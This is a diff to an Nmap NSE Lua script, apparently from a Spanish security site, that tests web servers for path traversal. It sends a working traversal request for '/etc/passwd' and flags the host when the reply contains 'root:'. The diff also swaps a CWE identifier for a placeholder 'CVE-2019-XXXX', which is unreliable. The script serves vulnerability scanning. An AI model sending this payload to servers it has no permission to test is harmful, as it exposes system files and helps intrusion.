@@ -1,5 +1,5 @@
 description = [[
-Path traversal script para Nmap
+Path traversal
 ]]
 
 local http = require "http"
@@ -10,7 +10,7 @@ local string = require "string"
 
 ---
 -- @hackyseguridad
--- nmap -p <port> --script traversal <target>
+-- nmap -p <port> --script directorio <target>
 --
 
 author = "hackingyseguridad.com"
@@ -26,7 +26,7 @@ action = function(host, port)
     description = [[
     ]],
     IDS = {
-        CWE = "CWE-22"
+        CVE = "CVE-2019-XXXX"
     },
     references = {
         'http://www.hackingyseguridad.com',
@@ -43,7 +43,7 @@ action = function(host, port)
  local url = stdnse.get_script_args(SCRIPT_NAME..".url") or "/../../../../../etc/passwd"
  local response = http.generic_request(host, port, "GET", "/../../../../../etc/passwd", options)
 
- if response.status == 200 then
+ if response.status == 200 and string.match(response.body, "root:")  then
  -- if response.status == 200 then
  vuln.state = vulns.STATE.VULN
  end
